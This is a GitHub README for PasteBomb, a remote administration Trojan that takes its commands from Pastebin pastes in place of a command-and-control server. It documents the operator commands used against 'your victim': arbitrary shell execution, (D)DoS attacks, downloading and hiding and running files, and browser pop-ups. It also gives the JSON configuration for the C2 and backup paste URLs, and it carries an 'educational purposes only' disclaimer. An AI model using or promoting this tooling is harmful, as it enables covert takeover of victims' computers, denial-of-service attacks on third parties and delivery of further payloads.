# PasteBomb
PasteBomb is a simple, yet powerful, remote administration Trojan (RAT) that allows you to execute terminal commands, send (D)DoS attacks, download files, and open messages in your victim's browser.
Without requiring a C2 server, using a Pastebin service instead. 
The tool is designed to be used for educational and research purposes only.


Any pastebin service that allows you to get a direct link to the raw content of a paste will work with PasteBomb.

**Important** PasteBomb is still in version 0.01 this is currently not ment to be used for penertation testing but rather to demonstrate the concept of a RAT that uses Pastebin as a C2 server.

The debug version is the same as the `main` branch but the malware has print statements

# Usage

## Commands

To execute your commands simply edit your paste with the new commands


`cmd` - execute terminal commands.
Usage:
`cmd <your command here>`

`dos` - send a (D)DOS attack.
Usage:
`dos <IP/domain> <port> <duration>`

`download` - download files to your victim's computer with options to `RUN` and `HIDE` the file.
Usage:
`download <direct download link> <destination> <args (RUN, HIDE)>`

`popmsg` - open a message in your victim's browser.
Usage:
`popmsg <message>`

## Config
The configuration for PasteBomb is described in JSON format and includes three parameters: one required and one optional.

`url` - the URL of your main paste (required)

`backups` - backup pastes; unlimited amount supported (optional)


Usage:
``` json
{
    "url": "http://yourpastebinservice.com/paste1",
    "backups": [
        "http://yourpastebinservice.com/paste2",
        "http://yourpastebinservice.com/paste3"
    ],
}
```
# OS support
PasteBomb currently supports macOS (Darwin), Windows, and Linux.



# License

This project is licensed under the custom terms as stated in the [LICENSE](https://github.com/marco-liberale/PasteBomb/blob/main/LICENSE) file of this repository. The software is provided "as is", for educational and research purposes only. 
Please refer to the `LICENSE` file for the full terms and conditions.


## Legal Disclamer
By using the repository, you acknowledge that you have read this [Disclaimer](https://github.com/marco-liberale/PasteBomb/blob/main/legal_disclamer.md) and agree to be bound by the terms hereof.
If you do not agree to abide by the above, please do not use the repository.
